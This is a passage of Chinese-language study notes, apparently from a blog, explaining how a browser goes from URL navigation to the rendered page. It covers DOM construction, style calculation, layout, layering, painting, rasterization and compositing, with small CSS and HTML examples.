请求的响应体数据。</p><ul><li>“提交文档”的消息是由浏览器进程发出的，渲染进程接收到“提交文档”的消息后，会和网络进程建立传输数据的“<strong>管道</strong>”。</li><li>等文档数据传输完成之后，渲染进程会返回“<strong>确认提交</strong>”的消息给浏览器进程。</li><li>浏览器进程在收到“确认提交”的消息后，会<strong>更新浏览器界面状态</strong>，包括了安全状态、地址栏的 URL、前进后退的历史状态，并更新 Web 页面。</li></ul><p>更新内容如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013154145646.png" alt="image-20221013154145646"></p><p>这也就解释了为什么在浏览器的地址栏里面输入了一个地址后，之前的页面没有立马消失，而是要加载一会儿才会更新页面。</p><p>到这里，一个完整的导航流程就“走”完了，这之后就要进入渲染阶段了。</p><h4 id="5-渲染阶段"><a href="#5-渲染阶段" class="headerlink" title="5. 渲染阶段"></a>5. 渲染阶段</h4><p>一旦文档被提交，渲染进程便开始页面解析和子资源加载了，关于这个阶段的完整过程，我会在下一篇文章中来专门介绍。这里你只需要先了解一旦页面生成完成，渲染进程会发送一个消息给浏览器进程，浏览器接收到消息后，会停止标签图标上的加载动画。如下所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013154202584.png" alt="image-20221013154202584"></p><p>至此，一个完整的页面就生成了。那文章开头的“从输入 URL 到页面展示，这中间发生了什么？”这个过程极其“串联”的问题也就解决了。</p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就到这里，下面我来简单总结下这篇文章的要点：</p><p>1、用户输入 url 并回车，浏览器会根据用户输入的信息判断是搜索还是网址。</p><p>2、如果是搜索内容，就将搜索内容+默认搜索引擎合成新的 URL；如果用户输入的内容符合 URL 规则，浏览器就会根据 URL 协议，在这段内容上加上协议合成合法的 URL</p><p>3、浏览器进程通过进程间通信（IPC）把 url 请求发送给网络进程</p><p>4、网络进程接收到 url 请求后检查本地缓存是否缓存了该请求资源，如果有则将该资源返回给浏览器进程</p><p>5、如果没有，网络进程向 web 服务器发起 http 请求（网络请求），请求流程如下：</p><blockquote><p>5.1 进行 DNS 解析，获取服务器 ip 地址，端口（端口是通过 dns 解析获取的吗？这里有个疑问）</p><p>5.2 利用 ip 地址和服务器建立 tcp 连接</p><p>5.3 构建请求头信息</p><p>5.4 发送请求头信息</p><p>5.5 服务器响应后，网络进程接收响应头和响应信息，并解析响应内容</p></blockquote><p>6，网络进程解析响应流程；</p><blockquote><p>6.1 检查状态码，如果是 301&#x2F;302，则需要重定向，从 Location 自动中读取地址，重新进行第 4 步 ，如果是 200，则继续处理请求。</p><p>6.2 200 响应处理： 检查响应类型 Content-Type，如果是字节流类型，则将该请求提交给下载管理器，该导航流程结束，不再进行 后续的渲染，如果是 html 则通知浏览器进程准备渲染进程准备进行渲染。</p></blockquote><p>7，准备渲染进程</p><blockquote><p>7.1 浏览器进程检查当前 url 是否和之前打开的渲染进程根域名是否相同，如果相同，则复用原来的进程，如果不同，则开启新的渲染进程</p></blockquote><p>8、浏览器会发出“提交文档”的消息给渲染进程，渲染进程收到消息后，会和网络进程建立传输数据的“管道”，文档数据传输完成后，渲染进程会返回“确认提交”的消息给浏览器进程。</p><p>9、浏览器收到“确认提交”的消息后，会更新浏览器的页面状态，包括了安全状态、地址栏的 URL、前进后退的历史状态，并更新 web 页面，此时的 web 页面是空白页</p><p>10、渲染进程对文档进行页面解析和子资源加载，HTML 通过 HTM 解析器转成 DOM Tree（二叉树类似结构的东西），CSS 按照 CSS 规则和 CSS 解释器转成 CSSOM TREE，两个 tree 结合，形成 render tree（不包含 HTML 的具体元素和元素要画的具体位置），通过 Layout 可以计算出每个元素具体的宽高颜色位置，结合起来，开始绘制，最后显示在屏幕中新页面显示出来。</p><p>11、一旦渲染完毕，渲染进程会发送一个消息给浏览器进程，浏览器接收到这个消息后会停止标签图标的加载动画</p><p>导航流程很重要，它是网络加载流程和渲染流程之间的一座桥梁，如果理解了导航流程，那么就能完整串起来整个页面显示流程，这对于理解浏览器的工作原理起到了点睛的作用。</p><h2 id="5-渲染流程（上）：HTML、CSS-和-JavaScript，是如何变成页面的？"><a href="#5-渲染流程（上）：HTML、CSS-和-JavaScript，是如何变成页面的？" class="headerlink" title="5. 渲染流程（上）：HTML、CSS 和 JavaScript，是如何变成页面的？"></a>5. 渲染流程（上）：HTML、CSS 和 JavaScript，是如何变成页面的？</h2><p>在上一篇中我们介绍了导航相关的流程，那导航被提交后又会怎么样呢？就进入了渲染阶段。这个阶段很重要，了解其相关流程能让你“看透”页面是如何工作的，有了这些知识，你可以解决一系列相关的问题，比如能熟练使用开发者工具，因为能够理解开发者工具里面大部分项目的含义，能优化页面卡顿问题，使用 JavaScript 优化动画流程，通过优化样式表来防止强制同步布局，等等。</p><p>既然它的功能这么强大，那么今天，我们就来好好聊聊<strong>渲染流程</strong>。</p><p>通常，我们编写好 HTML、CSS、JavaScript 等文件，经过浏览器就会显示出漂亮的页面（如下图所示），但是你知道它们是如何转化成页面的吗？这背后的原理，估计很多人都答不上来。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013165609007.png" alt="image-20221013165609007"></p><p>从图中可以看出，左边输入的是 HTML、CSS、JavaScript 数据，这些数据经过中间渲染模块的处理，最终输出为屏幕上的像素。</p><p>这中间的<strong>渲染模块</strong>就是我们今天要讨论的主题。为了能更好地理解下文，你可以先结合下图快速抓住 HTML、CSS 和 JavaScript 的含义：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013165629966.png" alt="image-20221013165629966"></p><p>从上图可以看出，<strong>HTML 的内容是由标记和文本组成</strong>。标记也称为<strong>标签</strong>，每个标签都有它自己的语意，浏览器会根据标签的语意来正确展示 HTML 内容。比如上面的<code>&lt;p&gt;</code>标签是告诉浏览器在这里的内容需要创建一个新段落，中间的文本就是段落中需要显示的内容。</p><p>如果需要改变 HTML 的字体颜色、大小等信息，就需要用到 CSS。CSS 又称为<strong>层叠样式表，是由选择器和属性组成</strong>，比如图中的 p 选择器，它会把 HTML 里面<code>&lt;p&gt;</code>标签的内容选择出来，然后再把选择器的属性值应用到<code>&lt;p&gt;</code>标签内容上。选择器里面有个 color 属性，它的值是 red，这是告诉渲染引擎把<code>&lt;p&gt;</code>标签的内容显示为红色。</p><p>至于<strong>JavaScript（简称为 JS），使用它可以使网页的内容“动”起来</strong>，比如上图中，可以通过 JavaScript 来修改 CSS 样式值，从而达到修改文本颜色的目的。</p><p>搞清楚 HTML、CSS 和 JavaScript 的含义后，那么接下来我们就正式开始分析渲染模块了。</p><p>由于渲染机制过于复杂，所以渲染模块在执行过程中会被划分为很多子阶段，输入的 HTML 经过这些子阶段，最后输出像素。我们把这样的一个处理流程叫做<strong>渲染流水线</strong>，其大致流程如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013165647456.png" alt="image-20221013165647456"></p><p>按照渲染的时间顺序，流水线可分为如下几个子阶段：构建 DOM 树、样式计算、布局阶段、分层、绘制、分块、光栅化和合成。内容比较多，我会用两篇文章来为你详细讲解这各个子阶段。接下来，在介绍每个阶段的过程中，你应该重点关注以下三点内容：</p><ul><li>开始每个子阶段都有其<strong>输入的内容</strong>；</li><li>然后每个子阶段有其<strong>处理过程</strong>；</li><li>最终每个子阶段会生成<strong>输出内容</strong>。</li></ul><p>理解了这三部分内容，能让你更加清晰地理解每个子阶段。</p><h3 id="构建-DOM-树"><a href="#构建-DOM-树" class="headerlink" title="构建 DOM 树"></a>构建 DOM 树</h3><p>为什么要构建 DOM 树呢？<strong>这是因为浏览器无法直接理解和使用 HTML，所以需要将 HTML 转换为浏览器能够理解的结构——DOM 树</strong>。</p><p>这里我们还需要简单介绍下什么是<strong>树结构</strong>，为了更直观地理解，你可以参考下面我画的几个树结构：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013165706679.png" alt="image-20221013165706679"></p><p>从图中可以看出，树这种结构非常像我们现实生活中的“树”，其中每个点我们称为<strong>节点</strong>，相连的节点称为<strong>父子节点</strong>。树结构在浏览器中的应用还是比较多的，比如下面我们要介绍的渲染流程，就在频繁地使用树结构。</p><p>接下来咱们还是言归正传，来看看 DOM 树的构建过程，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013165725609.png" alt="image-20221013165725609"></p><p>从图中可以看出，构建 DOM 树的<strong>输入内容</strong>是一个非常简单的 HTML 文件，然后经由 HTML 解析器解析，最终输出树状结构的 DOM。</p><p>为了更加直观地理解 DOM 树，你可以打开 Chrome 的“开发者工具”，选择“Console”标签来打开控制台，然后在控制台里面输入“document”后回车，这样你就能看到一个完整的 DOM 树结构，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013165754771.png" alt="image-20221013165754771"></p><p>图中的 document 就是 DOM 结构，你可以看到，DOM 和 HTML 内容几乎是一样的，但是和 HTML 不同的是，DOM 是保存在内存中树状结构，可以通过 JavaScript 来查询或修改其内容。</p><p>那下面就来看看如何通过 JavaScript 来修改 DOM 的内容，在控制台中输入：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">document.getElementsByTagName(&quot;p&quot;)[0].innerText = &quot;black&quot;</span><br></pre></td></tr></table></figure><p>这行代码的作用是把第一个<code>&lt;p&gt;</code>标签的内容修改为 black，具体执行结果你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013165828654.png" alt="image-20221013165828654"></p><p>从图中可以看出，在执行了一段修改第一个<code>&lt;p&gt;</code>标签的 JavaScript 代码后，DOM 的第一个 p 节点的内容成功被修改，同时页面中的内容也被修改了。</p><p>好了，现在我们已经生成 DOM 树了，但是 DOM 节点的样式我们依然不知道，要让 DOM 节点拥有正确的样式，这就需要样式计算了。</p><h3 id="样式计算（Recalculate-Style）"><a href="#样式计算（Recalculate-Style）" class="headerlink" title="样式计算（Recalculate Style）"></a>样式计算（Recalculate Style）</h3><p>样式计算的目的是为了计算出 DOM 节点中每个元素的具体样式，这个阶段大体可分为三步来完成。</p><h4 id="1-把-CSS-转换为浏览器能够理解的结构"><a href="#1-把-CSS-转换为浏览器能够理解的结构" class="headerlink" title="1. 把 CSS 转换为浏览器能够理解的结构"></a>1. 把 CSS 转换为浏览器能够理解的结构</h4><p>那 CSS 样式的来源主要有哪些呢？你可以先参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013165842167.png" alt="image-20221013165842167"></p><p>从图中可以看出，CSS 样式来源主要有三种：</p><ul><li>通过 link 引用的外部 CSS 文件</li><li><code>&lt;style&gt;</code>标记内的 CSS</li><li>元素的 style 属性内嵌的 CSS</li></ul><p>和 HTML 文件一样，浏览器也是无法直接理解这些纯文本的 CSS 样式，所以<strong>当渲染引擎接收到 CSS 文本时，会执行一个转换操作，将 CSS 文本转换为浏览器可以理解的结构——styleSheets</strong>。</p><p>为了加深理解，你可以在 Chrome 控制台中查看其结构，只需要在控制台中输入 document.styleSheets，然后就看到如下图所示的结构：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013165857716.png" alt="image-20221013165857716"></p><p>从图中可以看出，这个样式表包含了很多种样式，已经把那三种来源的样式都包含进去了。当然样式表的具体结构不是我们今天讨论的重点，你只需要知道渲染引擎会把获取到的 CSS 文本全部转换为 styleSheets 结构中的数据，并且该结构同时具备了查询和修改功能，这会为后面的样式操作提供基础。</p><h4 id="2-转换样式表中的属性值，使其标准化"><a href="#2-转换样式表中的属性值，使其标准化" class="headerlink" title="2. 转换样式表中的属性值，使其标准化"></a>2. 转换样式表中的属性值，使其标准化</h4><p>现在我们已经把现有的 CSS 文本转化为浏览器可以理解的结构了，那么<strong>接下来就要对其进行属性值的标准化操作</strong>。</p><p>要理解什么是属性值标准化，你可以看下面这样一段 CSS 文本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body &#123; font-size: 2em &#125;</span><br><span class="line"></span><br><span class="line">p &#123;color:blue;&#125;</span><br><span class="line"></span><br><span class="line">span  &#123;display: none&#125;</span><br><span class="line"></span><br><span class="line">div &#123;font-weight: bold&#125;</span><br><span class="line"></span><br><span class="line">div  p &#123;color:green;&#125;</span><br><span class="line"></span><br><span class="line">div &#123;color:red; &#125;</span><br></pre></td></tr></table></figure><p>可以看到上面的 CSS 文本中有很多属性值，如 2em、blue、bold，这些类型数值不容易被渲染引擎理解，所以<strong>需要将所有值转换为渲染引擎容易理解的、标准化的计算值</strong>，这个过程就是属性值标准化。</p><p>那标准化后的属性值是什么样子的？</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013165947906.png" alt="image-20221013165947906"></p><p>从图中可以看到，2em 被解析成了 32px，red 被解析成了 rgb(255,0,0)，bold 被解析成了 700……</p><h4 id="3-计算出-DOM-树中每个节点的具体样式"><a href="#3-计算出-DOM-树中每个节点的具体样式" class="headerlink" title="3. 计算出 DOM 树中每个节点的具体样式"></a>3. 计算出 DOM 树中每个节点的具体样式</h4><p>现在样式的属性已被标准化了，接下来就需要计算 DOM 树中每个节点的样式属性了，如何计算呢？</p><p><strong>这就涉及到 CSS 的继承规则和层叠规则了。</strong></p><p>首先是 CSS 继承。<strong>CSS 继承就是每个 DOM 节点都包含有父节点的样式</strong>。这么说可能有点抽象，我们可以结合具体例子，看下面这样一张样式表是如何应用到 DOM 节点上的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">body &#123; font-size: 20px &#125;</span><br><span class="line">p &#123;color:blue;&#125;</span><br><span class="line">span  &#123;display: none&#125;</span><br><span class="line">div &#123;font-weight: bold;color:red&#125;</span><br><span class="line">div  p &#123;color:green;&#125;</span><br></pre></td></tr></table></figure><p>这张样式表最终应用到 DOM 节点的效果如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013170030356.png" alt="image-20221013170030356"></p><p>从图中可以看出，所有子节点都继承了父节点样式。比如 body 节点的 font-size 属性是 20，那 body 节点下面的所有节点的 font-size 都等于 20。</p><p>为了加深你对 CSS 继承的理解，你可以打开 Chrome 的“开发者工具”，选择第一个“element”标签，再选择“style”子标签，你会看到如下界面：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013170042499.png" alt="image-20221013170042499"></p><p>这个界面展示的信息很丰富，大致可描述为如下。</p><ul><li>首先，可以选择要查看的<strong>元素的样式（位于图中的区域 2 中）</strong>，在图中的第 1 个区域中点击对应的元素元素，就可以了下面的区域查看该元素的样式了。比如这里我们选择的元素是<code>&lt;p&gt;</code>标签，位于 html.body.div. 这个路径下面。</li><li>其次，可以从<strong>样式来源（位于图中的区域 3 中）</strong>中查看样式的具体来源信息，看看是来源于样式文件，还是来源于 UserAgent 样式表。<strong>这里需要特别提下 UserAgent 样式，它是浏览器提供的一组默认样式，如果你不提供任何样式，默认使用的就是 UserAgent 样式</strong>。</li><li>最后，可以通过区域 2 和区域 3 来查看样式继承的具体过程。</li></ul><p>以上就是 CSS 继承的一些特性，样式计算过程中，会根据 DOM 节点的继承关系来合理计算节点样式。</p><p>样式计算过程中的第二个规则是样式层叠。<strong>层叠是 CSS 的一个基本特征，它是一个定义了如何合并来自多个源的属性值的算法。它在 CSS 处于核心地位，CSS 的全称“层叠样式表”正是强调了这一点</strong>。关于层叠的具体规则这里就不做过多介绍了，网上资料也非常多，你可以自行搜索学习。</p><p>总之，样式计算阶段的目的是为了计算出 DOM 节点中每个元素的具体样式，在计算过程中需要遵守 CSS 的继承和层叠两个规则。这个阶段最终输出的内容是每个 DOM 节点的样式，并被保存在 ComputedStyle 的结构内。</p><p>如果你想了解每个 DOM 元素最终的计算样式，可以打开 Chrome 的“开发者工具”，选择第一个“element”标签，然后再选择“Computed”子标签，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013170057001.png" alt="image-20221013170057001"></p><p>上图红色方框中显示了 html.body.div.p 标签的 ComputedStyle 的值。你想要查看哪个元素，点击左边对应的标签就可以了。</p><h3 id="布局阶段"><a href="#布局阶段" class="headerlink" title="布局阶段"></a>布局阶段</h3><p>现在，我们有 DOM 树和 DOM 树中元素的样式，但这还不足以显示页面，因为我们还不知道 DOM 元素的几何位置信息。<strong>那么接下来就需要计算出 DOM 树中可见元素的几何位置，我们把这个计算过程叫做布局</strong>。</p><p>Chrome 在布局阶段需要完成两个任务：创建布局树和布局计算。</p><h4 id="1-创建布局树"><a href="#1-创建布局树" class="headerlink" title="1. 创建布局树"></a>1. 创建布局树</h4><p>你可能注意到了 DOM 树还含有很多不可见的元素，比如 head 标签，还有使用了 display:none 属性的元素。所以<strong>在显示之前，我们还要额外地构建一棵只包含可见元素布局树</strong>。</p><p>我们结合下图来看看布局树的构造过程：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013170107403.png" alt="image-20221013170107403"></p><p>从上图可以看出，DOM 树中所有不可见的节点都没有包含到布局树中。</p><p>为了构建布局树，浏览器大体上完成了下面这些工作：</p><ul><li>遍历 DOM 树中的所有可见节点，并把这些节点加到布局中；</li><li>而不可见的节点会被布局树忽略掉，如 head 标签下面的全部内容，再比如 body.p.span 这个元素，因为它的属性包含 dispaly:none，所以这个元素也没有被包进布局树。</li></ul><h4 id="2-布局计算"><a href="#2-布局计算" class="headerlink" title="2. 布局计算"></a>2. 布局计算</h4><p>现在我们有了一棵完整的布局树。那么接下来，就要计算布局树节点的坐标位置了。布局的计算过程非常复杂，我们这里先跳过不讲，等到后面章节中我再做详细的介绍。</p><p>在执行布局操作的时候，会把布局运算的结果重新写回布局树中，所以布局树既是输入内容也是输出内容，这是布局阶段一个不合理的地方，因为在布局阶段并没有清晰地将输入内容和输出内容区分开来。针对这个问题，Chrome 团队正在重构布局代码，下一代布局系统叫 LayoutNG，试图更清晰地分离输入和输出，从而让新设计的布局算法更加简单。</p><h3 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h3><p>好了，今天正文就到这里，我画了下面这张比较完整的渲染流水线，你可以结合这张图来回顾下今天的内容。</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013170122090.png" alt="image-20221013170122090"></p><p>从图中可以看出，本节内容我们介绍了渲染流程的前三个阶段：DOM 生成、样式计算和布局。要点可大致总结为如下：</p><ul><li>浏览器不能直接理解 HTML 数据，所以第一步需要将其转换为浏览器能够理解的 DOM 树结构；</li><li>生成 DOM 树后，还需要根据 CSS 样式表，来计算出 DOM 树所有节点的样式；</li><li>最后计算 DOM 元素的布局信息，使其都保存在布局树中。</li></ul><p>到这里我们的每个节点都拥有了自己的样式和布局信息，那么后面几个阶段就要利用这些信息去展示页面了，由于篇幅限制，剩下的这些阶段我会在下一篇文章中介绍。</p><h2 id="6-渲染流程（下）：HTML、CSS-和-JavaScript，是如何变成页面的？"><a href="#6-渲染流程（下）：HTML、CSS-和-JavaScript，是如何变成页面的？" class="headerlink" title="6. 渲染流程（下）：HTML、CSS 和 JavaScript，是如何变成页面的？"></a>6. 渲染流程（下）：HTML、CSS 和 JavaScript，是如何变成页面的？</h2><p>在<a href="">上篇文章</a>中，我们介绍了渲染流水线中的<strong>DOM 生成、样式计算</strong>和<strong>布局</strong>三个阶段，那今天我们接着讲解渲染流水线后面的阶段。</p><p>里还是先简单回顾下上节前三个阶段的主要内容：在 HTML 页面内容被提交给渲染引擎之后，渲染引擎首先将 HTML 解析为浏览器可以理解的 DOM；然后根据 CSS 样式表，计算出 DOM 树所有节点的样式；接着又计算每个元素的几何坐标位置，并将这些信息保存在布局树中。</p><h3 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h3><p>现在我们有了布局树，而且每个元素的具体位置信息都计算出来了，那么接下来是不是就要开始着手绘制页面了？</p><p>答案依然是否定的。</p><p>因为页面中有很多复杂的效果，如一些复杂的 3D 变换、页面滚动，或者使用 z-indexing 做 z 轴排序等，为了更加方便地实现这些效果，<strong>渲染引擎还需要为特定的节点生成专用的图层，并生成一棵对应的图层树</strong>（LayerTree）。如果你熟悉 PS，相信你会很容易理解图层的概念，正是这些图层叠加在一起构成了最终的页面图像。</p><p>要想直观地理解什么是图层，你可以打开 Chrome 的“开发者工具”，选择“Layers”标签，就可以可视化页面的分层情况，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173353935.png" alt="image-20221013173353935"></p><p>从上图可以看出，渲染引擎给页面分了很多图层，这些图层按照一定顺序叠加在一起，就形成了最终的页面，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173408907.png" alt="image-20221013173408907"></p><p>现在你知道了<strong>浏览器的页面实际上被分成了很多图层，这些图层叠加后合成了最终的页面</strong>。下面我们再来看看这些图层和布局树节点之间的关系，如文中图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173419730.png" alt="image-20221013173419730"></p><p>通常情况下，<strong>并不是布局树的每个节点都包含一个图层，如果一个节点没有对应的层，那么这个节点就从属于父节点的图层</strong>。如上图中的 span 标签没有专属图层，那么它们就从属于它们的父节点图层。但不管怎样，最终每一个节点都会直接或者间接地从属于一个层。</p><p>那么需要满足什么条件，渲染引擎才会为特定的节点创建新的层呢？通常满足下面两点中任意一点的元素就可以被提升为单独的一个图层。</p><p><strong>第一点，拥有层叠上下文属性的元素会被提升为单独的一层。</strong></p><p>页面是个二维平面，但是层叠上下文能够让 HTML 元素具有三维概念，这些 HTML 元素按照自身属性的优先级分布在垂直于这个二维平面的 z 轴上。你可以结合下图来直观感受下：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173432018.png" alt="image-20221013173432018"></p><p>从图中可以看出，明确定位属性的元素、定义透明属性的元素、使用 CSS 滤镜的元素等，都拥有层叠上下文属性。</p><p>若你想要了解更多层叠上下文的知识，你可以<a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Understanding_z_index/The_stacking_context">参考这篇文章</a>。</p><p><strong>第二点，需要剪裁（clip）的地方也会被创建为图层。</strong></p><p>不过首先你需要了解什么是剪裁，结合下面的 HTML 代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">      div &#123;</span><br><span class="line">            width: 200;</span><br><span class="line">            height: 200;</span><br><span class="line">            overflow:auto;</span><br><span class="line">            background: gray;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div &gt;</span><br><span class="line">        &lt;p&gt; 所以元素有了层叠上下文的属性或者需要被剪裁，那么就会被提升成为单独一层，你可以参看下图：&lt;/p&gt;</span><br><span class="line">        &lt;p&gt; 从上图我们可以看到，document 层上有 A 和 B 层，而 B 层之上又有两个图层。这些图层组织在一起也是一颗树状结构。&lt;/p&gt;</span><br><span class="line">        &lt;p&gt; 图层树是基于布局树来创建的，为了找出哪些元素需要在哪些层中，渲染引擎会遍历布局树来创建层树（Update LayerTree）。&lt;/p&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p>在这里我们把 div 的大小限定为 200 _ 200 像素，而 div 里面的文字内容比较多，文字所显示的区域肯定会超出 200 _ 200 的面积，这时候就产生了剪裁，渲染引擎会把裁剪文字内容的一部分用于显示在 div 区域，下图是运行时的执行结果：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173452094.png" alt="image-20221013173452094"></p><p>出现这种裁剪情况的时候，渲染引擎会为文字部分单独创建一个层，如果出现滚动条，滚动条也会被提升为单独的层。你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173502667.png" alt="image-20221013173502667"></p><p>所以说，元素有了层叠上下文的属性或者需要被剪裁，满足这任意一点，就会被提升成为单独一层。</p><h3 id="图层绘制"><a href="#图层绘制" class="headerlink" title="图层绘制"></a>图层绘制</h3><p>在完成图层树的构建之后，渲染引擎会对图层树中的每个图层进行绘制，那么接下来我们看看渲染引擎是怎么实现图层绘制的？</p><p>试想一下，如果给你一张纸，让你先把纸的背景涂成蓝色，然后在中间位置画一个红色的圆，最后再在圆上画个绿色三角形。你会怎么操作呢？</p><p>通常，你会把你的绘制操作分解为三步：</p><ol><li>绘制蓝色背景；</li><li>在中间绘制一个红色的圆；</li><li>再在圆上绘制绿色三角形。</li></ol><p>渲染引擎实现图层的绘制与之类似，会把一个图层的绘制拆分成很多小的<strong>绘制指令</strong>，然后再把这些指令按照顺序组成一个待绘制列表，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173515873.png" alt="image-20221013173515873"></p><p>从图中可以看出，绘制列表中的指令其实非常简单，就是让其执行一个简单的绘制操作，比如绘制粉色矩形或者黑色的线等。而绘制一个元素通常需要好几条绘制指令，因为每个元素的背景、前景、边框都需要单独的指令去绘制。所以在图层绘制阶段，输出的内容就是这些待绘制列表。</p><p>你也可以打开“开发者工具”的“Layers”标签，选择“document”层，来实际体验下绘制列表，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173526474.png" alt="image-20221013173526474"></p><p>在该图中，区域 1 就是 document 的绘制列表，拖动区域 2 中的进度条可以重现列表的绘制过程。</p><h3 id="栅格化（raster）操作"><a href="#栅格化（raster）操作" class="headerlink" title="栅格化（raster）操作"></a>栅格化（raster）操作</h3><p>绘制列表只是用来记录绘制顺序和绘制指令的列表，而实际上绘制操作是由渲染引擎中的合成线程来完成的。你可以结合下图来看下渲染主线程和合成线程之间的关系：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173537421.png" alt="image-20221013173537421"></p><p>如上图所示，当图层的绘制列表准备好之后，主线程会把该绘制列表<strong>提交（commit）</strong>给合成线程，那么接下来合成线程是怎么工作的呢？</p><p>那我们得先来看看什么是视口，你可以参看下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173549536.png" alt="image-20221013173549536"></p><p>通常一个页面可能很大，但是用户只能看到其中的一部分，我们把用户可以看到的这个部分叫做<strong>视口</strong>（viewport）。</p><p>在有些情况下，有的图层可以很大，比如有的页面你使用滚动条要滚动好久才能滚动到底部，但是通过视口，用户只能看到页面的很小一部分，所以在这种情况下，要绘制出所有图层内容的话，就会产生太大的开销，而且也没有必要。</p><p>基于这个原因，<strong>合成线程会将图层划分为图块（tile）</strong>，这些图块的大小通常是 256x256 或者 512x512，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173602432.png" alt="image-20221013173602432"></p><p>然后<strong>合成线程会按照视口附近的图块来优先生成位图，实际生成位图的操作是由栅格化来执行的。所谓栅格化，是指将图块转换为位图</strong>。而图块是栅格化执行的最小单位。渲染进程维护了一个栅格化的线程池，所有的图块栅格化都是在线程池内执行的，运行方式如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173612820.png" alt="image-20221013173612820"></p><p>通常，栅格化过程都会使用 GPU 来加速生成，使用 GPU 生成位图的过程叫快速栅格化，或者 GPU 栅格化，生成的位图被保存在 GPU 内存中。</p><p>相信你还记得，GPU 操作是运行在 GPU 进程中，如果栅格化操作使用了 GPU，那么最终生成位图的操作是在 GPU 中完成的，这就涉及到了跨进程操作。具体形式你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173625909.png" alt="image-20221013173625909"></p><p>从图中可以看出，渲染进程把生成图块的指令发送给 GPU，然后在 GPU 中执行生成图块的位图，并保存在 GPU 的内存中。</p><h3 id="合成和显示"><a href="#合成和显示" class="headerlink" title="合成和显示"></a>合成和显示</h3><p>一旦所有图块都被光栅化，合成线程就会生成一个绘制图块的命令——“DrawQuad”，然后将该命令提交给浏览器进程。</p><p>浏览器进程里面有一个叫 viz 的组件，用来接收合成线程发过来的 DrawQuad 命令，然后根据 DrawQuad 命令，将其页面内容绘制到内存中，最后再将内存显示在屏幕上。</p><p>到这里，经过这一系列的阶段，编写好的 HTML、CSS、JavaScript 等文件，经过浏览器就会显示出漂亮的页面了。</p><h3 id="渲染流水线大总结"><a href="#渲染流水线大总结" class="headerlink" title="渲染流水线大总结"></a>渲染流水线大总结</h3><p>好了，我们现在已经分析完了整个渲染流程，从 HTML 到 DOM、样式计算、布局、图层、绘制、光栅化、合成和显示。下面我用一张图来总结下这整个渲染流程：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013173636816.png" alt="image-20221013173636816"></p><p>结合上图，一个完整的渲染流程大致可总结为如下：</p><ol><li>渲染进程将 HTML 内容转换为能够读懂的<strong>DOM 树</strong>结构。</li><li>渲染引擎将 CSS 样式表转化为浏览器可以理解的<strong>styleSheets</strong>，计算出 DOM 节点的样式。</li><li>创建<strong>布局树</strong>，并计算元素的布局信息。</li><li>对布局树进行分层，并生成<strong>分层树</strong>。</li><li>为每个图层生成<strong>绘制列表</strong>，并将其提交到合成线程。</li><li>合成线程将图层分成<strong>图块</strong>，并在<strong>光栅化线程池</strong>中将图块转换成位图。</li><li>合成线程发送绘制图块命令<strong>DrawQuad</strong>给浏览器进程。</li><li>浏览器进程根据 DrawQuad 消息<strong>生成页面</strong>，并<strong>显示</strong>到显示器上。</li></ol><h3 id="相关概念"><a href="#相关概念" class="headerlink" 